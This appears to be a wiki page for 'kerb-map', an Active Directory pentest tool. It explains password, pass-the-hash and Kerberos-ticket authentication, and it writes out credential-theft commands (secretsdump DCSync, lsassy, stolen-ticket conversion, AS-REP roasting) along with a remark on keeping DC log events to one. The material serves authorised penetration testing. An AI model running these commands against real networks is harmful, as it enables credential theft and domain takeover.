# Authentication

> kerb-map supports three authentication methods. All three share a single LDAP connection object — credentials are negotiated once at startup and every module reuses the same session without re-authenticating.

---

## Method 1 — Plaintext Password

```bash
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -p Password123
```

**When to use:** Initial access after a password spray, phish, or provided credentials.

**How it works:** ldap3 performs an NTLM bind using `DOMAIN\username` and the password. The password is never written to disk by kerb-map.

---

## Method 2 — Pass-the-Hash (NTLM)

Use an NTLM hash directly — no plaintext password needed.

```bash
# Full LM:NT format
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith \
    -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# NT hash only (LM half is auto-padded with the empty LM hash)
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith \
    -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**When to use:** After dumping hashes with secretsdump, mimikatz, or lsassy — when you have the NT hash but not the plaintext.

**How it works:** NTLM authentication uses the hash directly as the credential. The LM half is padded automatically with `aad3b435b51404eeaad3b435b51404ee` (the empty LM hash) if only the NT half is supplied.

**Where hashes come from:**
```bash
# secretsdump (remote DCSync or VSS)
secretsdump.py corp.local/DA_user:Password@192.168.1.10 -just-dc

# secretsdump output format:
# jsmith:1103:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#                                               ^^^^^ this is the NT hash you need

# lsassy (from a live session)
lsassy -d corp.local -u admin -p pass 192.168.1.20
```

---

## Method 3 — Kerberos ccache Ticket

Use a Kerberos TGT stored in a ccache file. No password or hash needed.

```bash
# Step 1 — point KRB5CCNAME at your ticket file
export KRB5CCNAME=/tmp/jsmith.ccache

# Step 2 — run kerb-map with -k
kerb-map -d corp.local -dc 192.168.1.10 -u jsmith -k
```

**When to use:**
- After Pass-the-Ticket — you've imported a stolen or forged ticket
- After `getST.py` or `ticketer.py` from impacket
- After Rubeus `dump` — convert the `.kirbi` to ccache first

**How it works:** ldap3 uses SASL/GSSAPI (Kerberos) authentication and reads the ticket from the path in `KRB5CCNAME`.

**Getting a ccache from various sources:**

```bash
# From getTGT.py (impacket)
getTGT.py corp.local/jsmith:Password123
export KRB5CCNAME=jsmith.ccache

# From a stolen .kirbi (Rubeus dump)
python ticketConverter.py jsmith.kirbi jsmith.ccache
export KRB5CCNAME=jsmith.ccache

# From getST.py (service ticket)
getST.py -spn cifs/fileserver.corp.local corp.local/jsmith:Password123
export KRB5CCNAME=jsmith@cifs_fileserver.corp.local.ccache

# After noPac or other Kerberos exploitation
export KRB5CCNAME=administrator.ccache
kerb-map -d corp.local -dc corp.local -u administrator -k
```

**Common error — clock skew:**
```
KRB_AP_ERR_SKEW: Clock skew too great
```
Kerberos requires the attacker machine clock to be within 5 minutes of the DC:
```bash
sudo ntpdate -u 192.168.1.10
# or
sudo timedatectl set-ntp false && sudo date --set "$(net time -S 192.168.1.10 2>/dev/null)"
```

---

## Authentication Decision Guide

```
Do you have a plaintext password?
  YES → use -p

Do you have an NTLM hash but no plaintext?
  YES → use -H

Do you have a Kerberos ticket (.ccache or .kirbi)?
  YES → convert to ccache if needed, set KRB5CCNAME, use -k

Do you have nothing yet?
  → Run kerbrute for username enum, then password spray
  → Or attempt AS-REP roasting without credentials:
     GetNPUsers.py corp.local/ -no-pass -usersfile users.txt
```

---

## How the Connection Is Reused

Once the LDAP bind succeeds, the same connection object is passed to every module:

```
LDAPClient (authenticated once)
    │
    ├──► SPNScanner.scan()
    ├──► ASREPScanner.scan()
    ├──► DelegationMapper.map_all()
    ├──► UserEnumerator.enumerate()
    └──► CVEScanner.run()
```

This means kerb-map generates only **one** authentication event on the DC (Event ID 4624 or 4768/4769 depending on auth type), regardless of how many modules run.

---

## Troubleshooting Authentication

| Error | Cause | Fix |
|---|---|---|
| `LDAPBindError: invalidCredentials` | Wrong password or hash | Double-check credentials |
| `LDAPSocketOpenError` | DC not reachable on port 389 | Check network, firewall |
| `KRB_AP_ERR_SKEW` | Clock skew > 5 minutes | Sync clock with `ntpdate` |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password for Kerberos | Use -p or -H instead of -k |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | Username doesn't exist | Verify username |
| `NT_STATUS_LOGON_FAILURE` | Incorrect hash | Get a fresh hash |

---

## See Also

- [Installation & Setup](Installation-and-Setup)
- [Flag Reference](Flag-Reference)
- [AD Pentest Methodology — Initial Access](AD-Pentest-Methodology#3-phase-1--reconnaissance--initial-access)
